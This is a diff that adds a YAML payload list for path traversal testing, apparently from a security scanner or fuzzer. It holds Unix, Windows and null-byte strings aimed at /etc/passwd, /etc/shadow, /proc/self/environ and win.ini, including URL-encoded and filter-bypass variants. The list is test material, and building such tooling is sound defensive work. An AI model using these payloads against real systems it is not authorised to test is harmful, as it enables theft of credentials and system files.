@@ -1,0 +1,26 @@
+# Path traversal payloads — used when field is classified as "path"
+# Separate from injection.yaml for composability
+
+unix:
+  - "../../etc/passwd"
+  - "../../../etc/shadow"
+  - "../../../../etc/hosts"
+  - "/etc/passwd"
+  - "/etc/shadow"
+  - "/proc/self/environ"
+  - "/proc/self/cmdline"
+  - "....//....//etc/passwd"
+  - "..%2f..%2fetc%2fpasswd"
+  - "%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+
+windows:
+  - "..\\..\\Windows\\win.ini"
+  - "C:\\Windows\\win.ini"
+  - "C:\\Users\\Administrator\\Desktop\\flag.txt"
+  - "%SYSTEMROOT%\\win.ini"
+  - "..%5c..%5cWindows%5cwin.ini"
+
+null_byte:
+  - "../../etc/passwd\x00.jpg"
+  - "../../etc/passwd%00.jpg"
+  - "../../etc/passwd%00"
